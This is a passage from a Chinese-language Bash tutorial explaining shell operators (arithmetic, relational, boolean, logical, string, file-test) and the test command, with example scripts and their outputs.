<td>减法</td>
<td><code>expr $a - $b</code> 结果为 -10。</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
<td><code>expr $a \* $b</code> 结果为 200。</td>
</tr>
<tr>
<td>/</td>
<td>除法</td>
<td><code>expr $b / $a</code> 结果为 2。</td>
</tr>
<tr>
<td>%</td>
<td>取余</td>
<td><code>expr $b % $a</code> 结果为 0。</td>
</tr>
<tr>
<td>=</td>
<td>赋值</td>
<td>a=$b 将把变量 b 的值赋给 a。</td>
</tr>
<tr>
<td>==</td>
<td>相等。用于比较两个数字，相同则返回 true。</td>
<td><code>[ $a == $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>!=</td>
<td>不相等。用于比较两个数字，不相同则返回 true。</td>
<td><code>[ $a != $b ]</code> 返回 true。</td>
</tr>
</tbody>
</table>
<p>算术运算符实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> <span class="variable">$a</span> + <span class="variable">$b</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a + b : <span class="variable">$val</span>&quot;</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> <span class="variable">$a</span> - <span class="variable">$b</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a - b : <span class="variable">$val</span>&quot;</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> <span class="variable">$a</span> \* <span class="variable">$b</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a * b : <span class="variable">$val</span>&quot;</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> <span class="variable">$b</span> / <span class="variable">$a</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;b / a : <span class="variable">$val</span>&quot;</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> <span class="variable">$b</span> % <span class="variable">$a</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;b % a : <span class="variable">$val</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> == <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a + b : 30</span><br><span class="line">a - b : -10</span><br><span class="line">a * b : 200</span><br><span class="line">b / a : 2</span><br><span class="line">b % a : 0</span><br><span class="line">a 不等于 b</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>乘号(*)前边必须加反斜杠<code>\</code>才能实现乘法运算；</p>
</li>
<li class="lvl-2">
<p>if…then…fi 是条件语句，后续将会讲解。</p>
</li>
<li class="lvl-2">
<p>在 MAC 中 shell 的 expr 语法是：<strong>$((表达式))</strong>，此处表达式中的 “*” 不需要转义符号 <code>\</code> 。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">let</span> varName=算术表达式</span><br><span class="line">varName=$[算术表达式]</span><br><span class="line">varName=$((算术表达式))</span><br></pre></td></tr></table></figure>
<h4 id="关系运算符">关系运算符</h4>
<p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。</p>
<p>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-eq</td>
<td>检测两个数是否相等，相等返回 true。</td>
<td><code>[ $a -eq $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>-ne</td>
<td>检测两个数是否不相等，不相等返回 true。</td>
<td><code>[ $a -ne $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-gt</td>
<td>检测左边的数是否大于右边的，如果是，则返回 true。</td>
<td><code>[ $a -gt $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>-lt</td>
<td>检测左边的数是否小于右边的，如果是，则返回 true。</td>
<td><code>[ $a -lt $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-ge</td>
<td>检测左边的数是否大于等于右边的，如果是，则返回 true。</td>
<td><code>[ $a -ge $b ]</code>返回 false。</td>
</tr>
<tr>
<td>-le</td>
<td>检测左边的数是否小于等于右边的，如果是，则返回 true。</td>
<td><code>[ $a -le $b ]</code> 返回 true。</td>
</tr>
</tbody>
</table>
<p>关系运算符实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -eq <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -eq <span class="variable">$b</span> : a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -eq <span class="variable">$b</span>: a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -ne <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -ne <span class="variable">$b</span>: a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -ne <span class="variable">$b</span> : a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -gt <span class="variable">$b</span>: a 大于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -gt <span class="variable">$b</span>: a 不大于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -lt <span class="variable">$b</span>: a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -lt <span class="variable">$b</span>: a 不小于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -ge <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -ge <span class="variable">$b</span>: a 大于或等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -ge <span class="variable">$b</span>: a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -le <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -le <span class="variable">$b</span>: a 小于或等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> -le <span class="variable">$b</span>: a 大于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10 -eq 20: a 不等于 b</span><br><span class="line">10 -ne 20: a 不等于 b</span><br><span class="line">10 -gt 20: a 不大于 b</span><br><span class="line">10 -lt 20: a 小于 b</span><br><span class="line">10 -ge 20: a 小于 b</span><br><span class="line">10 -le 20: a 小于或等于 b</span><br></pre></td></tr></table></figure>
<h4 id="布尔运算符">布尔运算符</h4>
<p>下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>!</td>
<td>非运算，表达式为 true 则返回 false，否则返回 true。</td>
<td><code>[ ! false ]</code> 返回 true。</td>
</tr>
<tr>
<td>-o</td>
<td>或运算，有一个表达式为 true 则返回 true。</td>
<td><code>[ $a -lt 20 -o $b -gt 100 ]</code> 返回 true。</td>
</tr>
<tr>
<td>-a</td>
<td>与运算，两个表达式都为 true 才返回 true。</td>
<td><code>[ $a -lt 20 -a $b -gt 100 ]</code> 返回 false。</td>
</tr>
</tbody>
</table>
<p>布尔运算符实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> != <span class="variable">$b</span> : a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> == <span class="variable">$b</span>: a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt 100 -a <span class="variable">$b</span> -gt 15 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 100 且 <span class="variable">$b</span> 大于 15 : 返回 true&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 100 且 <span class="variable">$b</span> 大于 15 : 返回 false&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt 100 -o <span class="variable">$b</span> -gt 100 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 100 或 <span class="variable">$b</span> 大于 100 : 返回 true&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 100 或 <span class="variable">$b</span> 大于 100 : 返回 false&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt 5 -o <span class="variable">$b</span> -gt 100 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 5 或 <span class="variable">$b</span> 大于 100 : 返回 true&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> 小于 5 或 <span class="variable">$b</span> 大于 100 : 返回 false&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10 != 20 : a 不等于 b</span><br><span class="line">10 小于 100 且 20 大于 15 : 返回 <span class="literal">true</span></span><br><span class="line">10 小于 100 或 20 大于 100 : 返回 <span class="literal">true</span></span><br><span class="line">10 小于 5 或 20 大于 100 : 返回 <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h4 id="逻辑运算符">逻辑运算符</h4>
<p>以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20:</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;&amp;</td>
<td>逻辑的 AND</td>
<td><code>[[ $a -lt 100 &amp;&amp; $b -gt 100 ]]</code> 返回 false</td>
</tr>
<tr>
<td>||</td>
<td>逻辑的 OR</td>
<td>`[[ $a -lt 100</td>
</tr>
</tbody>
</table>
<p>逻辑运算符实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$a</span> -lt 100 &amp;&amp; <span class="variable">$b</span> -gt 100 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;返回 true&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;返回 false&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$a</span> -lt 100 || <span class="variable">$b</span> -gt 100 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;返回 true&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;返回 false&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">返回 <span class="literal">false</span></span><br><span class="line">返回 <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h4 id="字符串运算符">字符串运算符</h4>
<p>下表列出了常用的字符串运算符，假定变量 a 为 “abc”，变量 b 为 “efg”：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>检测两个字符串是否相等，相等返回 true。</td>
<td><code>[ $a = $b ]</code> 返回 false。</td>
</tr>
<tr>
<td>!=</td>
<td>检测两个字符串是否相等，不相等返回 true。</td>
<td><code>[ $a != $b ]</code> 返回 true。</td>
</tr>
<tr>
<td>-z</td>
<td>检测字符串长度是否为0，为0返回 true。</td>
<td><code>[ -z $a ]</code> 返回 false。</td>
</tr>
<tr>
<td>-n</td>
<td>检测字符串长度是否为0，不为0返回 true。</td>
<td><code>[ -n &quot;$a&quot; ]</code> 返回 true。</td>
</tr>
<tr>
<td>$</td>
<td>检测字符串是否为空，不为空返回 true。</td>
<td><code>[ $a ]</code> 返回 true。</td>
</tr>
</tbody>
</table>
<p>字符串运算符实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;efg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> = <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> = <span class="variable">$b</span> : a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> = <span class="variable">$b</span>: a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> != <span class="variable">$b</span> : a 不等于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> != <span class="variable">$b</span>: a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;-z <span class="variable">$a</span> : 字符串长度为 0&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;-z <span class="variable">$a</span> : 字符串长度不为 0&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$a</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;-n <span class="variable">$a</span> : 字符串长度不为 0&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;-n <span class="variable">$a</span> : 字符串长度为 0&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> : 字符串不为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span> : 字符串为空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">abc = efg: a 不等于 b</span><br><span class="line">abc != efg : a 不等于 b</span><br><span class="line">-z abc : 字符串长度不为 0</span><br><span class="line">-n abc : 字符串长度不为 0</span><br><span class="line">abc : 字符串不为空</span><br></pre></td></tr></table></figure>
<h4 id="文件测试运算符">文件测试运算符</h4>
<p>文件测试运算符用于检测 Unix 文件的各种属性。</p>
<p>属性检测描述如下：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-b file</td>
<td>检测文件是否是块设备文件，如果是，则返回 true。</td>
<td>[ -b $file ] 返回 false。</td>
</tr>
<tr>
<td>-c file</td>
<td>检测文件是否是字符设备文件，如果是，则返回 true。</td>
<td>[ -c $file ] 返回 false。</td>
</tr>
<tr>
<td>-d file</td>
<td>检测文件是否是目录，如果是，则返回 true。</td>
<td>[ -d $file ] 返回 false。</td>
</tr>
<tr>
<td>-f file</td>
<td>检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td>
<td>[ -f $file ] 返回 true。</td>
</tr>
<tr>
<td>-g file</td>
<td>检测文件是否设置了 SGID 位，如果是，则返回 true。</td>
<td>[ -g $file ] 返回 false。</td>
</tr>
<tr>
<td>-k file</td>
<td>检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td>
<td>[ -k $file ] 返回 false。</td>
</tr>
<tr>
<td>-p file</td>
<td>检测文件是否是有名管道，如果是，则返回 true。</td>
<td>[ -p $file ] 返回 false。</td>
</tr>
<tr>
<td>-u file</td>
<td>检测文件是否设置了 SUID 位，如果是，则返回 true。</td>
<td>[ -u $file ] 返回 false。</td>
</tr>
<tr>
<td>-r file</td>
<td>检测文件是否可读，如果是，则返回 true。</td>
<td>[ -r $file ] 返回 true。</td>
</tr>
<tr>
<td>-w file</td>
<td>检测文件是否可写，如果是，则返回 true。</td>
<td>[ -w $file ] 返回 true。</td>
</tr>
<tr>
<td>-x file</td>
<td>检测文件是否可执行，如果是，则返回 true。</td>
<td>[ -x $file ] 返回 true。</td>
</tr>
<tr>
<td>-s file</td>
<td>检测文件是否为空（文件大小是否大于0），不为空返回 true。</td>
<td>[ -s $file ] 返回 true。</td>
</tr>
<tr>
<td>-e file</td>
<td>检测文件（包括目录）是否存在，如果是，则返回 true。</td>
<td>[ -e $file ] 返回 true。</td>
</tr>
</tbody>
</table>
<p>其他检查符：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>-S</strong>: 判断某文件是否 socket。</p>
</li>
<li class="lvl-2">
<p><strong>-L</strong>: 检测文件是否存在并且是一个符号链接。</p>
</li>
</ul>
<p>变量 file 表示文件 <strong>/var/www/runoob/test.sh</strong>，它的大小为 100 字节，具有 <strong>rwx</strong> 权限。下面的代码，将检测该文件的各种属性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">file=<span class="string">&quot;/var/www/runoob/test.sh&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -r <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件可读&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不可读&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -w <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件可写&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不可写&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -x <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件可执行&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不可执行&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件为普通文件&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件为特殊文件&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件是个目录&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不是个目录&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -s <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件为空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$file</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件存在&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;文件不存在&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">文件可读</span><br><span class="line">文件可写</span><br><span class="line">文件可执行</span><br><span class="line">文件为普通文件</span><br><span class="line">文件不是个目录</span><br><span class="line">文件不为空</span><br><span class="line">文件存在</span><br></pre></td></tr></table></figure>
<h3 id="test命令">test命令</h3>
<p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p>
<h4 id="数值测试">数值测试</h4>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-eq</td>
<td>等于则为真</td>
</tr>
<tr>
<td>-ne</td>
<td>不等于则为真</td>
</tr>
<tr>
<td>-gt</td>
<td>大于则为真</td>
</tr>
<tr>
<td>-ge</td>
<td>大于等于则为真</td>
</tr>
<tr>
<td>-lt</td>
<td>小于则为真</td>
</tr>
<tr>
<td>-le</td>
<td>小于等于则为真</td>
</tr>
</tbody>
</table>
<p>实例演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num1=100</span><br><span class="line">num2=100</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1] -eq $[num2]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数相等！&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个数不相等！&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">两个数相等！</span><br></pre></td></tr></table></figure>
<p>代码中的 [] 执行基本的算数运算，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line">b=6</span><br><span class="line"></span><br><span class="line">result=$[a+b] <span class="comment"># 注意等号两边不能有空格</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;result 为： <span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>结果为:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">result</span> 为： <span class="number">11</span></span><br></pre></td></tr></table></figure>
<h4 id="字符串测试">字符串测试</h4>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>等于则为真</td>
</tr>
<tr>
<td>!=</td>
<td>不相等则为真</td>
</tr>
<tr>
<td>-z 字符串</td>
<td>字符串的长度为零则为真</td>
</tr>
<tr>
<td>-n 字符串</td>
<td>字符串的长度不为零则为真</td>
</tr>
</tbody>
</table>
<p>实例演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num1=<span class="string">&quot;ru1noob&quot;</span></span><br><span class="line">num2=<span class="string">&quot;runoob&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$num1</span> = <span class="variable">$num2</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个字符串相等!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;两个字符串不相等!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">两个字符串不相等!</span><br></pre></td></tr></table></figure>
<h4 id="文件测试">文件测试</h4>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e 文件名</td>
<td>如果文件存在则为真</td>
</tr>
<tr>
<td>-r 文件名</td>
<td>如果文件存在且可读则为真</td>
</tr>
<tr>
<td>-w 文件名</td>
<td>如果文件存在且可写则为真</td>
</tr>
<tr>
<td>-x 文件名</td>
<td>如果文件存在且可执行则为真</td>
</tr>
<tr>
<td>-s 文件名</td>
<td>如果文件存在且至少有一个字符则为真</td>
</tr>
<tr>
<td>-d 文件名</td>
<td>如果文件存在且为目录则为真</td>
</tr>
<tr>
<td>-f 文件名</td>
<td>如果文件存在且为普通文件则为真</td>
</tr>
<tr>
<td>-c 文件名</td>
<td>如果文件存在且为字符型特殊文件则为真</td>
</tr>
<tr>
<td>-b 文件名</td>
<td>如果文件存在且为块特殊文件则为真</td>
</tr>
</tbody>
</table>
<p>实例演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件已存在!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件不存在!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">文件已存在!</span><br></pre></td></tr></table></figure>
<p>另外，Shell还提供了与( -a )、或( -o )、非( ! )三个逻辑操作符用于将测试条件连接起来，其优先级为：“!“最高，”-a&quot;次之，”-o&quot;最低。例如：</p>
